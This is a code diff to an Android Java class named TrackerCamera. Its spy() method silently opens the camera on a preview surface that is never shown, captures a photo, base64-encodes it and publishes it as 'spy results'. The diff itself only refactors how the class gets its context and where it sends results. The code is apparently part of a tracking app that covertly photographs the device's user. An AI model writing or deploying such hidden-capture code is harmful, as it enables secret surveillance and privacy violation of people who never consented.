@@ -10,12 +10,17 @@ import org.json.JSONObject;
 import java.io.IOException;
 
 class TrackerCamera extends TrackerMethod {
+
+    public TrackerCamera(String name) {
+        super(name);
+    }
+
     @Override public void spy() {
 
         for (int i=0;i< Math.min(1,Camera.getNumberOfCameras());i++) {
             Camera cam = Camera.open(i);
             try {
-                SurfaceView view = new SurfaceView(TrackerManager.get());
+                SurfaceView view = new SurfaceView(getContext());
                 cam.setPreviewDisplay(view.getHolder());
                 cam.startPreview();
             } catch (IOException e) {
@@ -27,7 +32,7 @@ class TrackerCamera extends TrackerMethod {
                     JSONObject ret = new JSONObject();
                     String base64JPEG = new String(Base64.encode(data, Base64.DEFAULT));
                     ret.put("photo",base64JPEG);
-                    TrackerManager.get().publishSpyResults(this,ret);
+                    TrackerService.publishSpyResults(this,ret);
                     camera.release();
                 } catch (JSONException e) {
                     e.printStackTrace();
@@ -35,5 +40,4 @@ class TrackerCamera extends TrackerMethod {
             });
         }
     }
-    @Override public String getName() { return "Camera";}
 }
